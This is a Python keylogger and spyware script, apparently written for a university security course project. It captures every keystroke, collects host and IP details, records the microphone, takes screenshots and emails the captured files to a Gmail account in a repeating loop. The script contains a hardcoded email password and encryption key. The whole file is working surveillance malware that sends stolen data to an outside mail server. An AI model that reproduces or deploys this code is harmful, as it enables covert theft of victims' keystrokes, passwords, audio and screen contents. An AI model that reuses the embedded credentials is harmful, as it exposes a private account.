from fileinput import filename
from pkg_resources import to_filename
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from threading import Thread

import socket
import platform

from pynput.keyboard import Key, Listener

import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from multiprocessing import Process,freeze_support
from PIL import ImageGrab

count = 0
keys_list = []
email_addr = "mihirmcdonalds@gmail.com"
pass_formyemail = "midruz-soPwip-jagcy6"
key = "Dob7eO5c7tWLRdWQUacP0OZ7jvQngLjE2s1DmovnVGY="

# when any key pressed redirected to this function
def when_pressed(key):
    global keys_list, count
    keys_list.append(key)

    count += 1
    if count >= 1:
        count = 0
        write_in_file(keys_list)
        keys_list = []
    pass

# sending email
def email_func(file_name, attachment, toaddr):
    msg = MIMEMultipart()
    msg['From'] = toaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Hacked Stuff'
    body = 'something'
    msg.attach(MIMEText(body, 'plain'))
    file_name = file_name
    attachment = open(attachment, 'rb')

    m = MIMEBase('application', 'octet-stream')
    m.set_payload(attachment.read())
    encoders.encode_base64(m)
    m.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
    msg.attach(m)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(toaddr, pass_formyemail)
    text = msg.as_string()
    s.sendmail(toaddr, toaddr, text)
    s.quit()

#email_func('final_store.txt', '/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/final_store.txt', email_addr)

def personal_comp_info():
    with open('/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/sys_store.txt', "a+") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("http://api.ipify.org").text
            f.write("Public IP Address: ", public_ip)
        except Exception:
            f.write("Too secure for us to get public ip..." + '\n')
        
        f.write("The system is: " + platform.system() + " " + platform.version() + '\n')
        f.write("The machine is: " + platform.machine() + '\n')
        f.write("The processor is: " + platform.processor() + '\n')
        f.write("The hostname is: " + hostname + '\n')
        f.write("Priv Ip Addr: " + IPaddr + '\n')
# for writing the keys onto the file
#personal_comp_info()

def microphone():
    microphone_time = 10
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    write('/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/audio.wav', fs, myrecording )

#microphone()

def screenshot():
    img = ImageGrab.grab()
    img.save('/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/screenshot.png')

#screenshot()

def write_in_file(key):
    #creating the file
    with open('/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/final_store.txt', "a+") as f:
        for ke in key:
            k = str(ke).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def when_released(key):
    if key == Key.esc:
        return False

def listening():
    with Listener(on_press=when_pressed, on_release=when_released) as listener:
        listener.join()

def all_other_job():
    starttime = time.time()
    while True:
        personal_comp_info()
        encrypted_files = ['/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/sys_store.txt', '/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/final_store.txt']
        encrypted_file_names = ['/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/sys_store_e.txt', '/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/final_store_e.txt']
        i = 0
        for encryption in encrypted_files:
            with open(encrypted_files[i], 'rb') as f:
                data = f.read()
            
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)

            with open(encrypted_file_names[i], 'wb') as f:
                f.write(encrypted)
            email_func(encrypted_files[i],encrypted_files[i],email_addr)
            i+=1
            time.sleep(10)
        microphone()
        screenshot()
        email_func('micrec.wav','/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/audio.wav',email_addr)
        email_func('ss.png','/Users/mihir/Desktop/Everything/Uni/COMP6441/Something Awesome/screenshot.png',email_addr)
        time.sleep(100.0 - ((time.time() - starttime) % 100.0))

if __name__ == "__main__":
    Thread(target = listening).start()
    Thread(target = all_other_job).start()
    

